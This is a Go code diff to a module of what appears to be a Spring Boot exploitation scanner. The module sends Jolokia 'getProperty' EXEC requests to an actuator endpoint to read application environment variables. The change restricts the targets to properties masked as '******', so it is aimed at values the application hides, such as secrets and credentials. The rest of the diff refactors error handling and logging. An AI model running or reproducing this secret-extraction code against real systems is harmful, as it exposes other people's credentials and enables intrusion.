@@ -1,10 +1,12 @@
 package one
 
 import (
+	"bytes"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"github.com/projectdiscovery/gologger"
+	"github.com/projectdiscovery/retryablehttp-go"
 	"github.com/wjlin0/sbe-scan/pkg/method"
 	"github.com/wjlin0/sbe-scan/pkg/types"
 	"net/http"
@@ -58,14 +60,16 @@ func (a *Agent) Run(domain string, sessions *method.Session, options *types.Opti
 	case false:
 		properties = options.EnvName
 	case true:
-		for property, _ := range oldProperties {
-			properties = append(properties, property)
+		for property, value := range oldProperties {
+			if value == "******" {
+				properties = append(properties, property)
+			}
 		}
 	}
 	for _, property := range properties {
-		values := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
-		if values == "" {
-			return errors.New("method one can't get env value because of the first property is empty")
+		_, err := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
+		if err != nil {
+			return err
 		}
 		break
 	}
@@ -75,12 +79,12 @@ func (a *Agent) Run(domain string, sessions *method.Session, options *types.Opti
 		wg.Add(1)
 		go func(property string) {
 			defer wg.Done()
-			values := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
+			values, _ := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
 			if values != "" {
 				lock.Lock()
 				newProperties[property] = values
 				lock.Unlock()
-				gologger.Info().Msgf("method one get env value %s=%s", property, values)
+				gologger.Debug().Msgf("method one get env value %s=%s", property, values)
 			}
 
 		}(property)
@@ -95,33 +99,37 @@ func (a *Agent) Run(domain string, sessions *method.Session, options *types.Opti
 func Describe() string {
 	return "利用 jolokia 中利用的 mbean.getProperty 获取 springboot 的环境变量"
 }
-func (a *Agent) getEnvValue(sessions *method.Session, options *types.Options, url, mbean, env string) string {
+func (a *Agent) getEnvValue(sessions *method.Session, options *types.Options, url, mbean, env string) (string, error) {
+	var (
+		err     error
+		resp    *http.Response
+		request *retryablehttp.Request
+		body    *bytes.Buffer
+	)
+
 	postBody := fmt.Sprintf("{\"mbean\": \"%s\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}", mbean, env)
-	request, err := sessions.NewRequest(http.MethodPost, url, postBody)
-	if err != nil {
-		return ""
+	if request, err = sessions.NewRequest(http.MethodPost, url, postBody); err != nil {
+		return "", err
 	}
 	if request.Header.Get("Content-Type") == "" {
 		request.Header.Set("Content-Type", "application/json")
 	}
-	resp, err := sessions.Do(request)
-	if err != nil {
-		return ""
+	if resp, err = sessions.Do(request); err != nil {
+		return "", err
 	}
 	if resp.StatusCode != http.StatusOK {
-		return ""
+		return "", fmt.Errorf("unexpected status code %d received from %s", resp.StatusCode, url)
 	}
-	body, err := method.ReadBody(resp)
-	if err != nil {
-		return ""
+	if body, err = method.ReadBody(resp); err != nil {
+		return "", err
 	}
 
 	// 序列化 json
 	responseJson := jsonRequest{}
-	if json.Unmarshal(body.Bytes(), &responseJson) != nil {
-		return ""
+	if err = json.Unmarshal(body.Bytes(), &responseJson); err != nil {
+		return "", err
 	}
-	return responseJson.Value
+	return responseJson.Value, nil
 }
 
 // jsonRequest 定义与 JSON 对应的结构体
